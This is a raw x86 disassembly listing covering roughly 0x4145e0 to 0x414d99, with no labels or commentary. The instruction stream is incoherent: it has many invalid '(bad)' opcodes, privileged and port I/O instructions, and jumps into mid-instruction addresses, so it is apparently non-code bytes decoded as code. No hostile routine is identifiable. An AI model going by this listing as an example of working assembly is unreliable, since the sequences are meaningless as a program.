  4145e0:	test   BYTE PTR ds:0xf8172f84,dh
  4145e6:	popf   
  4145e7:	ins    BYTE PTR es:[edi],dx
  4145e8:	ret    
  4145e9:	int    0x26
  4145eb:	push   edi
  4145ec:	idiv   BYTE PTR [ecx+0x5]
  4145ef:	mulps  xmm0,XMMWORD PTR [ebx-0x4207b09e]
  4145f6:	or     al,0xe
  4145f8:	inc    ecx
  4145f9:	sub    eax,ebp
  4145fb:	aad    0x67
  4145fd:	mov    ch,0x7f
  4145ff:	cs loop 0x4145ba
  414602:	xor    DWORD PTR [eax-0x759ec69a],esi
  414608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414609:	popf   
  41460a:	cmp    bl,ch
  41460c:	call   DWORD PTR ds:0x3ba37fa0
  414612:	adc    BYTE PTR [ebx],ch
  414614:	data16 mov cl,BYTE PTR [edi+edi*2+0x7a]
  414619:	xor    dl,BYTE PTR [ebp-0x2eb569ef]
  41461f:	outs   dx,BYTE PTR ds:[esi]
  414620:	dec    esi
  414621:	bswap  edx
  414623:	mov    al,0xa
  414625:	mov    ch,0xe3
  414627:	stos   BYTE PTR es:[edi],al
  414628:	loopne 0x414621
  41462a:	mov    edi,0x43870932
  41462f:	rep lods eax,DWORD PTR ds:[esi]
  414631:	pop    edi
  414632:	jns    0x4145d9
  414634:	out    0xcb,eax
  414636:	js     0x41463c
  414638:	xor    DWORD PTR [eax+0x68],ebp
  41463b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463c:	test   BYTE PTR [ebx+ecx*1+0x61bfd0f5],ch
  414643:	inc    ebp
  414644:	frstor [ecx+edi*2]
  414647:	cs jmp 0x414613
  41464a:	aaa    
  41464b:	enter  0xcfb2,0x7b
  41464f:	shr    ch,0xf8
  414652:	stos   BYTE PTR es:[edi],al
  414653:	xchg   esp,eax
  414654:	mov    ebp,0xdd32d573
  414659:	nop
  41465a:	sbb    eax,0x1802d276
  41465f:	jbe    0x41465c
  414661:	pop    esp
  414662:	cmp    DWORD PTR [edi+0x1f],0x62
  414666:	xor    dl,al
  414668:	(bad)  
  414669:	fcmovnbe st,st(5)
  41466b:	mov    ds:0xb3b0a7ad,al
  414670:	dec    esp
  414671:	jmp    0x4146b9
  414673:	and    al,0x80
  414675:	pop    ss
  414676:	and    esp,DWORD PTR [esi-0x3f1883fe]
  41467c:	sbb    eax,0xe312f06
  414681:	mov    edi,0x6e98ef15
  414686:	shl    DWORD PTR [esi-0x2e15303d],0x4
  41468d:	sti    
  41468e:	push   esi
  41468f:	or     eax,0xe8cf1fa5
  414694:	outs   dx,BYTE PTR ds:[esi]
  414695:	jg     0x4146d4
  414697:	add    bh,BYTE PTR [ebp+0x2e]
  41469a:	hlt    
  41469b:	fldcw  WORD PTR [edi-0x7999bd6b]
  4146a1:	sub    ecx,DWORD PTR [edi-0xe]
  4146a4:	rcl    DWORD PTR [esp+ebp*4],cl
  4146a7:	sbb    DWORD PTR [eax],ebx
  4146a9:	test   BYTE PTR [ecx-0x59],0x8
  4146ad:	in     al,dx
  4146ae:	jle    0x41465d
  4146b0:	xchg   ecx,eax
  4146b1:	add    ah,BYTE PTR [ebp-0x16]
  4146b4:	popf   
  4146b5:	outs   dx,BYTE PTR ds:[esi]
  4146b6:	cli    
  4146b7:	test   al,0x4e
  4146b9:	lock push esi
  4146bb:	mov    cl,BYTE PTR [edi]
  4146bd:	cwde   
  4146be:	add    BYTE PTR [ebx],0x75
  4146c1:	cwde   
  4146c2:	push   eax
  4146c3:	xchg   ebx,eax
  4146c4:	sbb    ch,al
  4146c6:	repz inc ebx
  4146c8:	push   cs
  4146c9:	dec    ebx
  4146ca:	and    cl,BYTE PTR [ecx]
  4146cc:	jb     0x4146a7
  4146ce:	test   al,0x8a
  4146d0:	aad    0x2b
  4146d2:	scas   eax,DWORD PTR es:[edi]
  4146d3:	cli    
  4146d4:	sar    BYTE PTR [eax],1
  4146d6:	cdq    
  4146d7:	jae    0x4146af
  4146d9:	jmp    DWORD PTR [edx+0x352846fb]
  4146df:	ficom  WORD PTR [ebx-0x668fcba0]
  4146e5:	loope  0x41469e
  4146e7:	out    0xe3,al
  4146e9:	mov    eax,ds:0x5574f63
  4146ee:	jl     0x4146ac
  4146f0:	dec    eax
  4146f1:	jmp    0x4146a8
  4146f3:	aas    
  4146f4:	jmp    0x4146ff
  4146f6:	scas   al,BYTE PTR es:[edi]
  4146f7:	shr    DWORD PTR [ecx+0x165225bf],1
  4146fd:	retf   
  4146fe:	push   es
  4146ff:	call   0xa8244874
  414704:	sub    DWORD PTR [esi],ebp
  414706:	dec    ecx
  414707:	mov    al,ds:0x214e40b8
  41470c:	mov    esi,0x8bf22629
  414711:	push   es
  414712:	neg    eax
  414714:	jae    0x414727
  414716:	pop    ds
  414717:	lock add edi,DWORD PTR [ecx+0x28]
  41471b:	or     BYTE PTR [ecx-0x6a],ch
  41471e:	cwde   
  41471f:	adc    ah,BYTE PTR [edx]
  414721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414722:	test   DWORD PTR [edx-0x5a],esi
  414725:	xchg   esp,eax
  414726:	push   edx
  414727:	mov    ch,0x52
  414729:	rcr    DWORD PTR [esi-0x4c],1
  41472c:	inc    edx
  41472d:	lea    edx,[edi-0x19e74353]
  414733:	jmp    0x41471e
  414735:	fstp   DWORD PTR [eax]
  414737:	push   es
  414738:	adc    BYTE PTR [ebp+eax*2-0x760f2ae8],bh
  41473f:	sahf   
  414740:	xlat   BYTE PTR ds:[ebx]
  414741:	loope  0x4147b2
  414743:	je     0x4146f9
  414745:	(bad)  
  414746:	jb     0x4146ee
  414748:	jecxz  0x414793
  41474a:	add    ch,BYTE PTR [esi]
  41474c:	cmp    eax,0x8255d0c7
  414751:	sbb    al,0x59
  414753:	aam    0x3a
  414755:	jmp    0x41478f
  414757:	dec    ebx
  414758:	imul   esp,DWORD PTR [eax-0x4ce58994],0x7c57ea02
  414762:	jmp    FWORD PTR [ebp-0x34]
  414765:	xor    edi,ecx
  414767:	test   eax,0x3c48bbe3
  41476c:	div    BYTE PTR [edx+0x3ec1df5c]
  414772:	sbb    DWORD PTR [ecx-0x4d],esp
  414775:	push   es
  414776:	imul   DWORD PTR [esi]
  414778:	mov    ah,0x1d
  41477a:	test   al,0x8b
  41477c:	or     edx,DWORD PTR [edi]
  41477e:	or     eax,0x5668a81c
  414783:	push   eax
  414784:	mov    edx,0x1dd9e117
  414789:	stos   DWORD PTR es:[edi],eax
  41478a:	adc    al,0x1f
  41478c:	gs xor esi,ebp
  41478f:	retf   
  414790:	and    dh,dh
  414792:	pop    esp
  414793:	push   edx
  414794:	xlat   BYTE PTR gs:[ebx]
  414796:	hlt    
  414797:	out    0x65,al
  414799:	enter  0xa24e,0x68
  41479d:	into   
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	or     DWORD PTR [ebp+0x67],ebx
  4147a2:	rcl    DWORD PTR [eax+eiz*1-0x16],cl
  4147a6:	das    
  4147a7:	in     eax,dx
  4147a8:	xchg   ebx,eax
  4147a9:	dec    esp
  4147aa:	int3   
  4147ab:	adc    al,0xe1
  4147ad:	mov    dh,bh
  4147af:	ja     0x41476e
  4147b1:	sub    eax,0xc3623243
  4147b6:	jecxz  0x414748
  4147b8:	cli    
  4147b9:	push   ecx
  4147ba:	and    DWORD PTR [esi+esi*8+0x34],edi
  4147be:	pop    ss
  4147bf:	xor    ebx,DWORD PTR [ebp+0x560d440d]
  4147c5:	sbb    BYTE PTR [ebx],ah
  4147c7:	js     0x4147c7
  4147c9:	ja     0x4147ad
  4147cb:	sbb    DWORD PTR [ebx+0x79],ecx
  4147ce:	and    al,0xf5
  4147d0:	cmp    DWORD PTR [ecx+0x1e],ecx
  4147d3:	push   ss
  4147d4:	lods   al,BYTE PTR ds:[esi]
  4147d5:	js     0x414794
  4147d7:	gs mov esi,0x20d55161
  4147dd:	(bad)  
  4147de:	or     eax,0xb680b5ad
  4147e3:	rcl    dl,0x3c
  4147e6:	test   BYTE PTR [ecx],0xaf
  4147e9:	mov    bh,0xf4
  4147eb:	and    dl,BYTE PTR [edi-0x12a3a9c0]
  4147f1:	mov    fs,WORD PTR [esi+eiz*1]
  4147f4:	mov    dh,0x80
  4147f6:	adc    dl,BYTE PTR [edx]
  4147f8:	mov    ebx,0xf7154f3f
  4147fd:	fmul   QWORD PTR [ebx+0x29]
  414800:	mov    dl,BYTE PTR [edx]
  414802:	jle    0x414824
  414804:	cmp    DWORD PTR [esi-0x2a],eax
  414807:	jmp    0x41485c
  414809:	cmp    eax,0x1fbd3e67
  41480e:	pop    esi
  41480f:	mov    ds:0x18b27aab,eax
  414814:	push   eax
  414815:	enter  0x3fe8,0x19
  414819:	mov    cl,0x38
  41481b:	cli    
  41481c:	add    edi,DWORD PTR [ecx]
  41481e:	push   es
  41481f:	addr16 nop
  414821:	adc    eax,0x8bb8d015
  414826:	add    al,0x83
  414828:	inc    eax
  414829:	pop    ebx
  41482a:	dec    esp
  41482b:	icebp  
  41482c:	loop   0x4147b6
  41482e:	add    edx,DWORD PTR [edi]
  414830:	std    
  414831:	int3   
  414832:	adc    dl,BYTE PTR [eax+eax*2-0x4]
  414836:	mov    eax,ds:0x747b3603
  41483b:	and    ebp,DWORD PTR [ecx+0x2b]
  41483e:	mov    edx,0x7ea11f11
  414843:	mov    bl,0xe7
  414845:	add    eax,esi
  414847:	ins    DWORD PTR es:[edi],dx
  414848:	jae    0x41486c
  41484a:	enter  0x4e7b,0x10
  41484e:	or     al,0x76
  414850:	arpl   di,si
  414852:	pop    ss
  414853:	lahf   
  414854:	arpl   di,bx
  414856:	dec    esp
  414857:	ins    BYTE PTR es:[edi],dx
  414858:	ja     0x4147f1
  41485a:	sub    DWORD PTR [esi],esp
  41485c:	pop    ds
  41485d:	mov    cs,WORD PTR [ebp-0x6abd700f]
  414863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414864:	cwde   
  414865:	xchg   di,ax
  414867:	dec    ebx
  414868:	and    esp,DWORD PTR [ebp+0xe]
  41486b:	push   cs
  41486c:	pop    ebx
  41486d:	pop    ebp
  41486e:	pop    eax
  41486f:	addr16 inc ebp
  414871:	adc    DWORD PTR [esi+ebp*8+0x497db5d9],0xf9af9967
  41487c:	cmp    DWORD PTR [esi+0xae0b59b],0x6c8da842
  414886:	jno    0x414864
  414888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414889:	mov    dh,0x49
  41488b:	sbb    bh,BYTE PTR [edx]
  41488d:	adc    eax,0xb2e3c779
  414892:	push   0x1d
  414894:	pop    edx
  414895:	je     0x41489b
  414897:	ins    BYTE PTR es:[edi],dx
  414898:	call   0x210a71f1
  41489d:	inc    eax
  41489e:	mov    al,0xab
  4148a0:	dec    ebp
  4148a1:	in     eax,dx
  4148a2:	arpl   di,bp
  4148a4:	push   esp
  4148a5:	popa   
  4148a6:	aam    0xba
  4148a8:	sbb    ch,BYTE PTR [edx]
  4148aa:	sbb    BYTE PTR [edi+ebp*8-0x4f4580a6],dh
  4148b1:	fisttp QWORD PTR [esi+0x1268c852]
  4148b7:	pop    ss
  4148b8:	mov    edx,0xdbc29d7f
  4148bd:	leave  
  4148be:	jb     0x41489e
  4148c0:	cwde   
  4148c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c2:	xor    al,bl
  4148c4:	push   ss
  4148c5:	daa    
  4148c6:	cmp    ch,BYTE PTR [edi]
  4148c8:	pop    es
  4148c9:	data16 and al,0x5b
  4148cc:	fisub  DWORD PTR [edi+0x2a2c06e1]
  4148d2:	aad    0xd
  4148d4:	xchg   DWORD PTR [eax+0x11e0298e],edi
  4148da:	xchg   edx,eax
  4148db:	fcmovbe st,st(5)
  4148dd:	jle    0x4148a6
  4148df:	xchg   edx,eax
  4148e0:	add    DWORD PTR [ebp-0x9],edi
  4148e3:	test   BYTE PTR [ecx],bh
  4148e5:	xchg   edx,eax
  4148e6:	les    edx,FWORD PTR [edx-0x41]
  4148e9:	mov    al,ds:0x288f358f
  4148ee:	push   eax
  4148ef:	add    BYTE PTR [ecx],dl
  4148f1:	sbb    esp,DWORD PTR [ebx+0x47]
  4148f4:	mov    BYTE PTR [edx+eax*4+0x441a55a2],ch
  4148fb:	(bad)  
  4148fc:	jns    0x414932
  4148fe:	fisubr WORD PTR [ebp-0x2c4ee9f3]
  414904:	leave  
  414905:	popf   
  414906:	xchg   ecx,eax
  414907:	push   ebp
  414908:	adc    al,BYTE PTR [edx+0x6f]
  41490b:	out    dx,al
  41490c:	add    al,0xce
  41490e:	neg    BYTE PTR [esi+ecx*1-0x44bb343a]
  414915:	push   ss
  414916:	aas    
  414917:	aam    0x6a
  414919:	jecxz  0x414909
  41491b:	stos   BYTE PTR es:[edi],al
  41491c:	fist   WORD PTR [ebp+0x41]
  41491f:	sbb    al,0xd3
  414921:	mov    dl,0xa8
  414923:	ins    DWORD PTR es:[edi],dx
  414924:	stc    
  414925:	fmulp  st(6),st
  414927:	add    dh,ch
  414929:	push   esi
  41492a:	test   DWORD PTR [esi*4+0x16dd47b2],esi
  414931:	repnz mov ch,0x2e
  414934:	cmp    BYTE PTR [ecx],dh
  414936:	adc    bh,ch
  414938:	shr    ch,0x23
  41493b:	pop    esp
  41493c:	mov    cl,0x88
  41493e:	add    ebx,eax
  414940:	push   ds
  414941:	out    0xb3,eax
  414943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414944:	fcom   DWORD PTR [eax-0x4d59f503]
  41494a:	mov    ah,0xe7
  41494c:	out    dx,al
  41494d:	test   eax,0x8f02f75
  414952:	lods   eax,DWORD PTR ds:[esi]
  414953:	push   cs
  414954:	mov    dh,0x97
  414956:	outs   dx,BYTE PTR ds:[esi]
  414957:	mov    bh,0x15
  414959:	sbb    ebp,ebx
  41495b:	(bad)  
  41495c:	or     eax,0x194bc481
  414961:	fcmovne st,st(0)
  414963:	sub    BYTE PTR [esi+0x2d5640be],ah
  414969:	fisub  WORD PTR [edx+0x1d]
  41496c:	lds    ebx,FWORD PTR [edx]
  41496e:	and    al,BYTE PTR [edx-0x41]
  414971:	fstp   QWORD PTR [esi]
  414973:	idiv   DWORD PTR ds:0x74b8bea4
  414979:	jg     0x414946
  41497b:	jae    0x41497f
  41497d:	sti    
  41497e:	ror    DWORD PTR [ecx-0x1b],1
  414981:	push   ss
  414982:	dec    edi
  414983:	cmp    dh,dh
  414985:	cld    
  414986:	mov    al,0x42
  414988:	ins    BYTE PTR es:[edi],dx
  414989:	sub    BYTE PTR [edi-0x269c2296],bl
  41498f:	leave  
  414990:	fsubr  QWORD PTR [ebx-0x70]
  414993:	mov    ebp,0x8f9b2177
  414998:	shr    DWORD PTR [esi+0x43efc04e],1
  41499e:	or     eax,0x45b3b19a
  4149a3:	jnp    0x414942
  4149a5:	sar    BYTE PTR [edi+0x14618954],0x3d
  4149ac:	mov    eax,0xc812c74a
  4149b1:	jo     0x414a1b
  4149b3:	inc    ecx
  4149b4:	scas   eax,DWORD PTR es:[edi]
  4149b5:	jo     0x4149b8
  4149b7:	dec    ecx
  4149b8:	sbb    DWORD PTR [ebx-0x7f91c7af],esp
  4149be:	inc    eax
  4149bf:	adc    DWORD PTR [esi+eax*1],0x34
  4149c3:	loop   0x414a28
  4149c5:	push   ecx
  4149c6:	jl     0x4149c9
  4149c8:	stos   BYTE PTR es:[edi],al
  4149c9:	jnp    0x41496b
  4149cb:	push   0x42
  4149cd:	ror    DWORD PTR [esi-0x7c],0x57
  4149d1:	(bad)  
  4149d2:	neg    al
  4149d4:	add    eax,0x5f406a7
  4149d9:	xchg   ecx,eax
  4149da:	ins    DWORD PTR es:[edi],dx
  4149db:	out    dx,eax
  4149dc:	inc    ebp
  4149dd:	inc    al
  4149df:	enter  0x78b3,0x53
  4149e3:	mov    ds:0xc73a1067,eax
  4149e8:	retf   0x890f
  4149eb:	add    dh,BYTE PTR [edi+0x526795ab]
  4149f1:	call   DWORD PTR [edx-0x185ba5f2]
  4149f7:	ror    edx,1
  4149f9:	push   0x39bcad5d
  4149fe:	cdq    
  4149ff:	mov    dl,0xb6
  414a01:	jl     0x414a60
  414a03:	test   al,0x9d
  414a05:	xor    DWORD PTR [ebx],esp
  414a07:	lods   al,BYTE PTR ds:[esi]
  414a08:	cwde   
  414a09:	mov    bh,0x7a
  414a0b:	jno    0x414996
  414a0d:	and    al,0xb9
  414a0f:	dec    edi
  414a10:	stc    
  414a11:	es or  dh,bh
  414a14:	inc    esi
  414a15:	cdq    
  414a16:	jecxz  0x4149fd
  414a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a19:	nop
  414a1a:	adc    eax,DWORD PTR ds:0xb3add4ca
  414a20:	js     0x414a23
  414a22:	jbe    0x414a22
  414a24:	inc    edx
  414a25:	add    ebp,DWORD PTR [esi-0x1b]
  414a28:	xchg   esp,eax
  414a29:	xor    eax,0x601679fc
  414a2e:	leave  
  414a2f:	cmp    eax,0xd7059d6f
  414a34:	stc    
  414a35:	jl     0x4149fb
  414a37:	mov    ds:0x9441a9d5,al
  414a3c:	(bad)  
  414a3d:	cwde   
  414a3e:	pop    ebx
  414a3f:	mov    esi,0xe1060c99
  414a44:	ret    0x61a6
  414a47:	add    BYTE PTR [esi+0x65],al
  414a4a:	call   0xc2ae5bd4
  414a4f:	in     eax,0x10
  414a51:	aaa    
  414a52:	ret    
  414a53:	or     esp,DWORD PTR [ebx]
  414a55:	cs push 0xffffff80
  414a58:	xchg   esp,eax
  414a59:	in     al,0xa7
  414a5b:	fnstsw WORD PTR [edi+0x17]
  414a5e:	mov    ebp,0xdf85d684
  414a63:	adc    eax,0xc1895bf6
  414a68:	mov    WORD PTR [eax],ds
  414a6a:	jle    0x414a17
  414a6c:	inc    ebp
  414a6d:	inc    ebp
  414a6e:	std    
  414a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a70:	pop    ds
  414a71:	(bad)  
  414a72:	dec    ebx
  414a73:	cmp    ebp,DWORD PTR [eax-0x72]
  414a76:	sub    BYTE PTR [edx],0xcc
  414a79:	xchg   edx,eax
  414a7a:	ins    BYTE PTR es:[edi],dx
  414a7b:	xor    eax,0x2e81f85c
  414a80:	or     ch,BYTE PTR [edx-0x72de7ca9]
  414a86:	cmp    esp,ebx
  414a88:	xor    edi,DWORD PTR [ebx+0x38f9d40e]
  414a8e:	(bad)  
  414a8f:	mov    edi,cs
  414a91:	dec    ebp
  414a92:	mov    DWORD PTR [edx-0x76],ebp
  414a95:	jp     0x414afa
  414a97:	jo     0x414a65
  414a99:	clc    
  414a9a:	push   ecx
  414a9b:	pop    esi
  414a9c:	inc    edx
  414a9d:	neg    ch
  414a9f:	js     0x414b1c
  414aa1:	or     ch,bh
  414aa3:	dec    esp
  414aa4:	cdq    
  414aa5:	sub    BYTE PTR [edx],0x45
  414aa8:	pop    es
  414aa9:	pop    ecx
  414aaa:	xchg   DWORD PTR [ecx-0x464ddd40],ebp
  414ab0:	push   ss
  414ab1:	add    dl,BYTE PTR [esi-0x1e]
  414ab4:	mov    ebp,DWORD PTR ds:0x5da37c35
  414aba:	sub    BYTE PTR fs:0x7983973a,cl
  414ac1:	shl    BYTE PTR [ebp+0x14a5563b],0xa
  414ac8:	mov    ch,0x1d
  414aca:	imul   edi,DWORD PTR [eax+ecx*8+0x11b680a6],0xffffffd5
  414ad2:	(bad)  
  414ad3:	fild   DWORD PTR [eax+0x62]
  414ad6:	dec    ecx
  414ad7:	push   0x48
  414ad9:	in     al,dx
  414ada:	pop    eax
  414adb:	loop   0x414ada
  414add:	into   
  414ade:	pop    ebx
  414adf:	mov    cl,0x8f
  414ae1:	jb     0x414b0d
  414ae3:	mov    ebx,0x41d8b52c
  414ae8:	mov    eax,ds:0x8dc6d779
  414aed:	inc    ecx
  414aee:	int3   
  414aef:	cli    
  414af0:	je     0x414ace
  414af2:	adc    esp,DWORD PTR [ebx]
  414af4:	dec    BYTE PTR ds:0x84ae9501
  414afa:	xor    ebx,DWORD PTR [ebx-0x50]
  414afd:	push   edi
  414afe:	fstp   TBYTE PTR [edi]
  414b00:	mov    ebp,eax
  414b02:	in     al,dx
  414b03:	dec    ebx
  414b04:	mov    bh,0xc5
  414b06:	pop    esi
  414b07:	std    
  414b08:	xchg   BYTE PTR [ebx-0x77],bh
  414b0b:	popf   
  414b0c:	enter  0x532,0x97
  414b10:	test   al,0x8e
  414b12:	and    DWORD PTR [ebp-0x798ad1ab],ebx
  414b18:	and    DWORD PTR [edx+eax*1+0x1c],esi
  414b1c:	enter  0xcb60,0xd8
  414b20:	push   edi
  414b21:	aaa    
  414b22:	or     BYTE PTR [esi+0x5e],cl
  414b25:	mov    al,0x89
  414b27:	sbb    eax,DWORD PTR [edi-0x5f]
  414b2a:	dec    esp
  414b2b:	push   0xea552b0a
  414b30:	sub    eax,0x6f7d4f32
  414b35:	dec    edx
  414b36:	inc    ebp
  414b37:	js     0x414b09
  414b39:	(bad)  
  414b3a:	(bad)  
  414b3b:	jmp    0xcfe36748
  414b40:	mov    ebp,0xd1bc9520
  414b45:	shl    edi,1
  414b47:	pop    ebp
  414b48:	(bad)  
  414b49:	xor    edx,ecx
  414b4b:	test   eax,0x7d94b71a
  414b50:	repz js 0x414b87
  414b53:	add    BYTE PTR [ebp+edi*2+0x63],0xe4
  414b58:	jle    0x414baf
  414b5a:	add    esp,DWORD PTR [ecx-0x154972f]
  414b60:	out    0x7a,al
  414b62:	fst    st(7)
  414b64:	(bad)
  414b67:	ins    BYTE PTR es:[edi],dx
  414b68:	nop
  414b69:	ins    BYTE PTR es:[edi],dx
  414b6a:	dec    edi
  414b6b:	xchg   esi,eax
  414b6c:	std    
  414b6d:	(bad)  
  414b6e:	jp     0x414bb7
  414b70:	or     BYTE PTR [edi+0x2],al
  414b73:	adc    ch,BYTE PTR [edi+ebp*4-0x18]
  414b77:	stos   BYTE PTR es:[edi],al
  414b78:	push   ecx
  414b79:	fiadd  DWORD PTR [edx-0x265cee70]
  414b7f:	or     BYTE PTR [ecx+0x1e],ch
  414b82:	mov    edx,0x8d67392a
  414b87:	out    dx,al
  414b88:	xchg   ecx,eax
  414b89:	repnz daa 
  414b8b:	test   eax,0x4814fed5
  414b90:	repnz test eax,0x6851f8c5
  414b96:	ss pop edx
  414b98:	jle    0x414ba8
  414b9a:	pop    ebp
  414b9b:	mov    ds:0x81938b47,eax
  414ba0:	mov    edi,0xdda25a1e
  414ba5:	xor    edi,0x61
  414ba8:	mov    ecx,DWORD PTR [esi+0x20]
  414bab:	or     al,0xdc
  414bad:	in     al,dx
  414bae:	xchg   ecx,eax
  414baf:	loop   0x414bc9
  414bb1:	mov    bh,0x9b
  414bb3:	push   esi
  414bb4:	lods   eax,DWORD PTR ds:[esi]
  414bb5:	inc    ebx
  414bb6:	cld    
  414bb7:	mov    BYTE PTR [edx-0x21],0x47
  414bbb:	jl     0x414b5d
  414bbd:	lds    ebp,FWORD PTR [eax+0x418e197b]
  414bc3:	sub    BYTE PTR [eax-0x7c],dl
  414bc6:	fld    QWORD PTR [ebx+0x6135b9e4]
  414bcc:	pop    ss
  414bcd:	and    BYTE PTR [edx+0x2d],ah
  414bd0:	jne    0x414bb1
  414bd2:	fadd   QWORD PTR [esi+0x3dcf678e]
  414bd8:	lea    edx,[edx-0x44d0d56b]
  414bde:	adc    ax,0xb856
  414be2:	dec    esp
  414be3:	fs pop ss
  414be5:	xor    cl,dh
  414be7:	pop    es
  414be8:	or     eax,0xa8f752a0
  414bed:	xor    eax,0x3277195a
  414bf2:	push   esp
  414bf3:	test   ebp,ebx
  414bf5:	retf   0x22e5
  414bf8:	aad    0x64
  414bfa:	das    
  414bfb:	sub    bl,al
  414bfd:	stc    
  414bfe:	pop    edi
  414bff:	sub    al,0xc0
  414c01:	cwde   
  414c02:	repnz adc ebx,ebp
  414c05:	push   eax
  414c06:	fdiv   QWORD PTR [edi]
  414c08:	iret   
  414c09:	js     0x414b9a
  414c0b:	mov    esi,0x33403d4b
  414c10:	dec    edx
  414c11:	sub    DWORD PTR [ecx-0x4fa80dec],0xd505412b
  414c1b:	enter  0x26dd,0x41
  414c1f:	pop    esp
  414c20:	push   ebx
  414c21:	aas    
  414c22:	push   esp
  414c23:	fs push cs
  414c25:	fcmove st,st(0)
  414c27:	xchg   edi,eax
  414c28:	xor    dl,BYTE PTR gs:[ecx-0x2f]
  414c2c:	dec    edi
  414c2d:	add    ecx,esp
  414c2f:	test   eax,0x2edb2aa4
  414c34:	mov    WORD PTR [ecx],gs
  414c36:	lods   al,BYTE PTR ds:[esi]
  414c37:	lea    esp,[eax+0x7a50c684]
  414c3d:	cmp    edi,ebp
  414c3f:	imul   edx,DWORD PTR [eax-0x69ac57ee],0xc0cb11b3
  414c49:	sbb    edi,0x5f
  414c4c:	popf   
  414c4d:	pop    edi
  414c4e:	icebp  
  414c4f:	js     0x414c03
  414c51:	shl    DWORD PTR ds:0x359df7df,cl
  414c57:	std    
  414c58:	sub    eax,DWORD PTR [esi+edx*1]
  414c5b:	or     edi,DWORD PTR [edi-0x6c2bd509]
  414c61:	js     0x414c0f
  414c63:	dec    ebp
  414c64:	pop    ecx
  414c65:	inc    esp
  414c66:	mov    dl,0xc4
  414c68:	dec    ecx
  414c69:	lahf   
  414c6a:	loope  0x414c5f
  414c6c:	aam    0xc8
  414c6e:	pushf  
  414c6f:	mov    ecx,0xaf839181
  414c74:	jmp    0xc8a4ad54
  414c79:	fisttp WORD PTR [esi]
  414c7b:	nop
  414c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c7d:	cmc    
  414c7e:	mov    dh,BYTE PTR [ebp+0x3a]
  414c81:	shl    DWORD PTR [edx+ecx*1-0x1f],cl
  414c85:	in     eax,dx
  414c86:	popa   
  414c87:	nop
  414c88:	int    0xb1
  414c8a:	pusha  
  414c8b:	push   cs
  414c8c:	xchg   DWORD PTR [edx+0x68],esi
  414c8f:	test   ebp,ebp
  414c91:	(bad)  
  414c92:	ficom  WORD PTR [edi+0x58d81772]
  414c98:	ror    ch,0xd4
  414c9b:	out    dx,eax
  414c9c:	mov    esp,0x3fec77ca
  414ca1:	imul   esp,ebx,0x51
  414ca4:	test   BYTE PTR ds:0xb10f592d,bl
  414caa:	fisubr WORD PTR [ebp-0x4aa6d9bf]
  414cb0:	scas   al,BYTE PTR es:[edi]
  414cb1:	xchg   esp,eax
  414cb2:	pusha  
  414cb3:	int3   
  414cb4:	inc    esp
  414cb5:	gs ret 
  414cb7:	das    
  414cb8:	xchg   DWORD PTR [edx],eax
  414cba:	mov    esi,0x4aca3111
  414cbf:	stc    
  414cc0:	jns    0x414cfd
  414cc2:	mov    ch,0x39
  414cc4:	sub    BYTE PTR [eax-0x29],0x46
  414cc8:	mov    eax,0xa5dd3d61
  414ccd:	cld    
  414cce:	add    ch,BYTE PTR [ebp+0x6d5c7f16]
  414cd4:	xor    al,0xf6
  414cd6:	cld    
  414cd7:	and    bh,ch
  414cd9:	bound  edx,QWORD PTR [edi+0x2e]
  414cdc:	sbb    eax,0xcf463561
  414ce1:	push   0x30
  414ce3:	push   cs
  414ce4:	ins    BYTE PTR es:[edi],dx
  414ce5:	inc    esi
  414ce6:	scas   al,BYTE PTR es:[edi]
  414ce7:	xchg   si,ax
  414ce9:	or     eax,0xd51fb974
  414cee:	xchg   ebx,eax
  414cef:	inc    esi
  414cf0:	xchg   BYTE PTR [eax-0x2a],bl
  414cf3:	pop    esp
  414cf4:	(bad)  [eax]
  414cf6:	jmp    0x30fae263
  414cfb:	push   edx
  414cfc:	out    dx,eax
  414cfd:	push   ss
  414cfe:	faddp  st(1),st
  414d00:	add    BYTE PTR [edx-0x41],0x23
  414d04:	jecxz  0x414cc2
  414d06:	jmp    0x414cea
  414d08:	sbb    al,0xcc
  414d0a:	out    dx,al
  414d0b:	jae    0x414d6e
  414d0d:	ja     0x414ce2
  414d0f:	and    al,BYTE PTR ds:0x5992c0e5
  414d15:	add    ecx,DWORD PTR [edi-0x3941e776]
  414d1b:	sub    BYTE PTR [ecx],0xbc
  414d1e:	jae    0x414d5f
  414d20:	das    
  414d21:	mov    ah,ah
  414d23:	(bad)  
  414d24:	lock cmp esp,DWORD PTR [edx-0x2c]
  414d28:	(bad)  
  414d29:	xor    eax,0xbfc2008e
  414d2e:	arpl   WORD PTR [edi+0x409685f7],dx
  414d34:	repz or DWORD PTR ds:0xf1f6614a,edi
  414d3b:	repz cmp eax,0xde55e1e
  414d41:	xchg   BYTE PTR [ecx+0x57],cl
  414d44:	or     eax,DWORD PTR [ecx]
  414d46:	jns    0x414dbc
  414d48:	sbb    eax,0xbcc00ec0
  414d4d:	loope  0x414da7
  414d4f:	aaa    
  414d50:	sbb    cl,BYTE PTR [eax-0x243f9aa0]
  414d56:	repz in al,dx
  414d58:	xor    eax,0x9d837d65
  414d5d:	arpl   WORD PTR [ecx-0x22953b42],sp
  414d63:	jg     0x414d81
  414d65:	js     0x414d4e
  414d67:	lock sbb eax,0x4c27e42a
  414d6d:	repz or DWORD PTR [eax-0x25],esi
  414d71:	mov    edx,0x89f79e8a
  414d76:	out    0x3a,eax
  414d78:	mov    esp,0x4277e00
  414d7d:	stc    
  414d7e:	mov    BYTE PTR ds:0xe403d350,bh
  414d84:	cmc    
  414d85:	dec    eax
  414d86:	xchg   edi,eax
  414d87:	test   eax,0x3460e200
  414d8c:	and    cl,dh
  414d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d8f:	clc    
  414d90:	and    DWORD PTR [edi],edx
  414d92:	fimul  WORD PTR [eax]
  414d94:	in     al,0x52
  414d96:	aaa    
  414d97:	adc    dh,ah
  414d99:	add    al,0xd7
